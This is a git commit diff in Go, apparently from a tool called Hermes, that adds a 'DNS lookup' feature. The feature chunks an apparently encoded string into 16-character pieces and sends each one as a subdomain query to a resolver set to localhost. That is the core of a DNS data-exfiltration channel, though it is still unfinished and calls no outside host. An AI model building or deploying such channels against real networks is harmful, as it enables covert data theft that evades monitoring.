942e3f13b9586b28d61ffc0a38086c23b4d1a987
sidhawkss <65626547+sidhawkss@users.noreply.github.com>
2024-07-25 21:03:06 -0300

    Feat: DNS lookup

--- pkg/conn/connection.go
+++ pkg/conn/connection.go
@@ -2,6 +2,9 @@ package conn
 
 import (
 	"fmt"
+	"net"
+	"context"
+	//"Hermes/pkg/enc"
 )
 
 type Interact interface{
@@ -15,6 +18,16 @@ type Data struct{
 	SecureString string
 	ConnectionType string
 }
+
+var dnsServer string = "127.0.0.1:53";
+var Resolv = &net.Resolver{
+	PreferGo: true,
+	Dial: func(ctx context.Context, network, address string) (net.Conn, error){
+		var d net.Dialer;
+		return d.DialContext(ctx, "udp", dnsServer);
+	},
+	
+};
 
 func SendDataTarget(i Interact) string{
 	switch(i.getType()){
@@ -30,16 +43,17 @@ func SendDataTarget(i Interact) string{
 }
 
 func (d Data) Dns() string{
-	
 	for i:=16; i <= len(d.SecureString); i += 16{
 		chunk := d.SecureString[i-16:i];
-		fmt.Println(chunk);
-		//net.LookupIP(sstr+".dns");
+		ips, err := Resolv.LookupIPAddr(context.Background(),chunk+".localhost");
+		if err != nil {
+			fmt.Println("Resolution error");
+		}
+		fmt.Println(ips);
 	}
-	// send done message
-	// wait response, 
-	// return response,
-	return "DNS SENT"
+	//handle response
+	
+	return "a"
 }
 
 func (d Data) Http() string{
